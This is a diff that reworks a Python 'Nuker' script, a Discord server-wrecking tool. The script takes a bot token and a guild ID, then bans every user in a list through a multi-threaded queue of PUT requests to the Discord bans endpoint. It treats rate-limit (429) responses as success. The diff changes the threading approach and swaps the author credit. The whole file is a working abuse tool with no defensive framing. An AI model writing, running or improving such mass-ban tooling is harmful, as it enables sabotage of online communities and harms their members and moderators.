@@ -1,8 +1,8 @@
 """
--> Created by float#8504
+Made by krypton#0420
 """
-import os, requests, threading, random, time
-from requests_futures.sessions import FuturesSession
+import os, httpx, threading, random, time
+from queue import Queue
 
 class Nuker:
 
@@ -14,11 +14,16 @@ class Nuker:
         print("-> Guild ID; ", end="")
         self.Guild = int(input())
 
+        print("-> Threads; ", end="")
+        self.Threads = int(input())
+
         self.Clear = lambda: os.system("cls; clear")
 
         self.Clear()
 
         self.Lock = threading.Lock()
+
+        self.Queue = Queue(self.Threads * 5)
         
         self.Request_Headers = {"Authorization": "Bot {}".format(self.Token)}
 
@@ -26,40 +31,44 @@ class Nuker:
 
         self.Users = []
 
-        self.Session = FuturesSession(max_workers=100)
-
     
-    def Send_Request(self, user: str):
+    def Send_Request(self):
         try:
-            response = self.Session.put(
-                "https://discord.com/api/v{}/guilds/{}/bans/{}".format(self.Api, self.Guild, user),
-                headers = self.Request_Headers,
-                json = {
-                    "reason": "float#8504"
-                }
-            ).result()
-            if response.status_code in [200, 201, 204, 429]:
-                pass # <- Somehow, printing would make the program more "slower" so i didnt use it here and used an null operation instead.
-            else:
-                json = response.json()
-                self.Lock.acquire()
-                print("-> Error; {}".format(json["message"]))
-                self.Lock.release()             
+            while True:
+                URLRequest = self.Queue.get()
+                response = httpx.put(
+                    URLRequest,
+                    headers = self.Request_Headers,
+                )
+                if response.status_code in [200, 201, 204, 429]:
+                    pass
+                else:
+                    json = response.json()
+                    self.Lock.acquire()
+                    print("-> Error; {}".format(json["message"]))
+                    self.Lock.release()             
         except (Exception):
-            return(threading.Thread(target=self.Send_Request, args=(user, )).start())
+            return self.Send_Request()
 
 
-    def MultiThreading(self):
+    def StartWorkers(self):
 
         print("-> Starting all workers.")
         
         for user in open("data/users.txt").read().splitlines():
             self.Users.append(user)
         
+        for _ in range(self.Threads):
+            threading.Thread(target=self.Send_Request, daemon=True).start()
+
         for user in self.Users:
-            threading.Thread(target=self.Send_Request, args=(user, )).start()
+            self.Queue.put(
+                "https://discord.com/api/v{}/guilds/{}/bans/{}".format(self.Api, self.Guild, user)
+            )
+        self.Queue.join()
 
         print("-> Workers finished."); time.sleep(3); os._exit(0)
 
 
-if __name__ == "__main__":  Nuker().MultiThreading()
+if __name__ == "__main__":  Nuker().StartWorkers()
+
